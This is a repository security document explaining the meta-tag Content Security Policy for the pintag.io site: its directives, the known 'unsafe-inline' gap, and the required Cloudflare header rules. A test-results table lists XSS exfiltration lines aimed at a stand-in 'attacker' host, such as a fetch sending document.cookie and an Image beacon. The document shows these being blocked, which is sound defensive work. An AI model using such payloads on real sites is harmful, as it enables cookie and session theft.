# Content Security Policy — what ships, why, and what is still missing

**Source of truth:** `scripts/csp-policy.mjs`
**Applied by:** `node scripts/apply-csp.mjs` (idempotent; stamps a `<meta>` tag into every published page)
**Verified by:** `cd tests/csp && npx playwright test` (21 tests, real Chromium, policy enforced)

---

## Why a meta tag

pintag.io is served by **GitHub Pages, which cannot set response headers at all.**
The only CSP delivery mechanism this repository controls end-to-end is
`<meta http-equiv="Content-Security-Policy">` in each page's `<head>`. That is a
fully-enforced policy for every directive except the handful that are
header-only.

Three layers therefore exist, and only the first is guaranteed today:

| Layer | Covers | Delivers | Status |
|---|---|---|---|
| `<meta>` in each page | all 17 published pages | everything except `frame-ancestors` / `report-to` | **live in this repo** |
| Cloudflare Worker (`og-listing-preview.js`) | `/`, `/index.html`, `/listings.html`, `/listing.html` | `frame-ancestors`, HSTS, `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`, `Permissions-Policy` | **in this repo, needs deploy** |
| Cloudflare Transform Rule | *everything else*, incl. `admin.html` | same headers, site-wide | **must be created in the dashboard — see below** |

The Worker deliberately does **not** emit a full `Content-Security-Policy`. Two
policies on one response are enforced as their *intersection*, so any drift
between the Worker and `csp-policy.mjs` would silently start blocking real
content. The pages own the policy; the Worker only adds what a meta tag cannot
express.

---

## The policy

```
default-src 'self';
base-uri 'self';
object-src 'none';
form-action 'self';
script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://unpkg.com;
style-src  'self' 'unsafe-inline' https://fonts.googleapis.com https://unpkg.com;
font-src   'self' data: https://fonts.gstatic.com;
img-src    'self' data: blob:
           https://eoladhcljbpbhnrmmpev.supabase.co
           https://ebtgoqrywdywuqrvudcp.supabase.co
           https://img.pintag.io https://pintag-cyrora.github.io
           https://unpkg.com https://*.tile.openstreetmap.org
           https://images.unsplash.com;
connect-src 'self'
           https://eoladhcljbpbhnrmmpev.supabase.co  https://ebtgoqrywdywuqrvudcp.supabase.co
           wss://eoladhcljbpbhnrmmpev.supabase.co    wss://ebtgoqrywdywuqrvudcp.supabase.co;
frame-src  https://maps.google.com https://www.google.com
           https://www.youtube.com https://www.youtube-nocookie.com;
media-src  'self' blob: <the two Supabase hosts>;
worker-src 'self' blob:;
manifest-src 'self';
upgrade-insecure-requests
```

| Directive | Why it is what it is |
|---|---|
| `script-src` | `cdn.jsdelivr.net` = supabase-js (admin pages), `unpkg.com` = Leaflet (map on listings.html). `'unsafe-inline'` is the known gap — see below. |
| `connect-src` | **The most valuable directive here.** Pinned to the two known Supabase project hosts, so injected script cannot `fetch()` or `sendBeacon()` anything to an attacker. Verified blocked in `tests/csp/csp.spec.js`. |
| `img-src` | Pinned for the same reason: `new Image().src = 'https://attacker/?'+data` is the exfiltration channel that survives a strict `connect-src` alone. `images.unsplash.com` is index.html's two hero backgrounds. |
| `style-src` | Google Fonts + Leaflet's stylesheet. `'unsafe-inline'` is required by the many generated `style="…"` attributes; unlike script, inline style is not a code-execution vector here. |
| `frame-src` | The Google Maps location embed and YouTube property videos. |
| `object-src 'none'`, `base-uri 'self'`, `form-action 'self'` | Free wins: no plugins, no `<base>` hijack, no form-based exfiltration. |

**No wildcards on the Supabase origins, ever.** `https://*.supabase.co` would let
an attacker exfiltrate to a Supabase project *they* created — anyone can make one
in a minute. `tests/csp/csp.spec.js` asserts the wildcard never reappears.

---

## The honest limitation: `'unsafe-inline'` in `script-src`

**This CSP does not stop injected script from running.** It stops injected
script from being *useful*.

Pintag builds inline event handlers at render time with interpolated data:

```js
onclick="ptContactClick({listingId:'<uuid>', unit:'<name>'})"
```

Those attributes are inline script. A **nonce cannot cover them** (nonces apply
to `<script>` elements, not attributes) and a **hash cannot either**, because the
text differs per listing and is generated at runtime. `'unsafe-hashes'` only
helps for a fixed, enumerable set of handlers, which this is not.

So removing `'unsafe-inline'` requires migrating every generated handler to
`addEventListener` delegation across `listing.html`, `admin.html`,
`listings.html`, `dashboard.html` and `intelligence.js`. That is a substantial
behavioural refactor and was deliberately **not** bundled into a security pass —
shipping it untested alongside the fixes would risk breaking the contact CTAs,
which are the product's revenue path.

### What the policy still buys, with `'unsafe-inline'` in place

Measured, not asserted — `tests/csp/csp.spec.js` performs each attempt in real
Chromium and requires the browser to refuse it:

| Attack step | Result |
|---|---|
| `fetch('https://attacker/?c='+document.cookie)` | **blocked** by `connect-src` |
| `navigator.sendBeacon('https://attacker/…')` | **blocked** by `connect-src` |
| `new Image().src = 'https://attacker/?d=…'` | **blocked** by `img-src` |
| `<script src="https://attacker/payload.js">` | **blocked** by `script-src` |
| `<base href="https://attacker/">` | **neutralised** by `base-uri` |

For the two XSS findings this audit fixed (F-01 admin session, F-02 public
listing page), the payload's *goal* was exfiltration. The CSP breaks the goal
even where it cannot break the execution. It is a second lock, not the first —
the escaping fix (`escJs()`) is the first.

### Path to a strict policy

1. Replace generated `onclick=` / `onerror=` attributes with delegated
   `addEventListener` handlers keyed on `data-*` attributes.
2. Move the remaining inline `<script>` blocks into external files (they are
   already large enough to deserve it) **or** add per-deploy nonces — which
   requires a real server, so external files are the realistic route on Pages.
3. Drop `'unsafe-inline'` from `script-src`; re-run `tests/csp`.

Until step 1 is done, steps 2–3 buy nothing: one dynamic `onclick` re-opens the
whole directive.

---

## Required Cloudflare Transform Rule

The Worker covers only four routes. **`admin.html` and the other tools get no
security headers until this rule exists.** Create it once:

*Cloudflare dashboard → your `pintag.io` zone → Rules → Transform Rules →
Modify Response Header → Create rule*

- **Rule name:** `Pintag security headers`
- **When incoming requests match:** `Hostname equals pintag.io` (add
  `www.pintag.io` if it serves content too)
- **Then… Set static:**

| Header | Value |
|---|---|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains; preload` |
| `X-Content-Type-Options` | `nosniff` |
| `X-Frame-Options` | `DENY` |
| `Referrer-Policy` | `strict-origin-when-cross-origin` |
| `Permissions-Policy` | `accelerometer=(), camera=(), geolocation=(), gyroscope=(), magnetometer=(), microphone=(), payment=(), usb=()` |
| `Content-Security-Policy` | `frame-ancestors 'none'` |

> Set **only** `frame-ancestors` in the `Content-Security-Policy` header — never
> a full policy. The pages already carry theirs in a meta tag, and a browser
> enforces the intersection of every policy it receives.

Verify afterwards:

```bash
curl -sI https://pintag.io/admin.html | grep -iE 'strict-transport|x-content-type|x-frame|referrer-policy|permissions-policy|content-security-policy'
```

`scripts/verify-production-http.sh` (section 8) checks these on every run of the
**Verify Production Security** workflow.

---

## Changing the policy

1. Edit `scripts/csp-policy.mjs` — the only place directives are defined.
2. `node scripts/apply-csp.mjs` — restamps all 17 pages.
3. `cd tests/csp && npx playwright test` — **must** pass before committing. This
   is what catches a subresource nobody remembered (it is how
   `images.unsplash.com` was found: a `url("https://…")` inside a `<style>`
   block that every source grep had missed).
4. `node scripts/apply-csp.mjs --check` runs in CI and fails if a page drifts.
